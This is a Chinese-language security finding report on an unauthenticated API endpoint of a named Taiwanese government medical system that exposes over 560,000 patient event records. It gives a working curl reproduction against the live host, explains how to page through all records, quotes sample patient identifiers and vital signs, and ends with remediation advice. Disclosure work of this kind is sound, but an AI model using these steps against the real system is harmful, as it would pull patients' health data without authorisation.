# 4001 /events 未授权批量泄露 PCDT 医疗事件数据（56万+条）

- ID: `744f04a2-3ac7-4406-87b3-ac55d1a23021`
- Severity: **high**
- Status: open
- Type: IDOR / 未授权访问
- Target: `https://epcr.tpf.gov.tw:4001/events`
- Conversation: `9f0a20d8-98b0-4f97-8e49-573ac9d822dc`
- Created: 2026-09-01 03:30:28.831348296+08:00

## Description

4001 vitalSignVideoServer 的 /events 接口未做鉴权，GET 即可分页拉取 PCDT 医疗压力负荷试验事件数据，包含 CaseID、recordUuid、血压/心率等字段与完整时间线。攻击者可批量拉取全量 56 万+ 条记录，形成大规模 PHI 泄露，且接口无速率限制，易被脚本一次性拖库。

## Preconditions

公网可达 https://epcr.tpf.gov.tw:4001

## Reproduction

1. curl -sk 'https://epcr.tpf.gov.tw:4001/events?limit=5'
2. 无需 Cookie、无需 JWT、无需 Header
3. 直接获得 JSON 数组，每条含 CaseID/recordUuid/Systolic/Diastolic/Pulse 等字段
4. 修改 limit=100 或 offset 参数可继续分页拉取

## Evidence

curl -sk 'https://epcr.tpf.gov.tw:4001/events?limit=5' 返回 HTTP 200，JSON 47768B，首条记录 updatedAt=2026-08-30T07:02:38.869Z，CaseID=180717152801fed7，recordUuid=180817092350fed7，Systolic=120，Diastolic=80，Pulse=62；其中 id=100 记录 CaseID="HACKED" TypeOfEventTxt="PWN" 为既往测试痕迹，updatedAt 同样为 2026-08-30

## Impact

567201 条医疗事件可无认证批量读取，含真实患者 CaseID、recordUuid、血压/心率等临床数据，构成大规模 PHI 泄露；数据自 2018-07-17 起持续至今，时间跨度近 8 年，可还原患者完整就诊与压力负荷试验历史。

## Recommendation

给 /events 增加 JWT 鉴权与角色控制；增加分页上限与速率限制；对 CaseID/recordUuid 做字段级加密或脱敏，避免明文外泄；对测试痕迹记录做归档或清理。
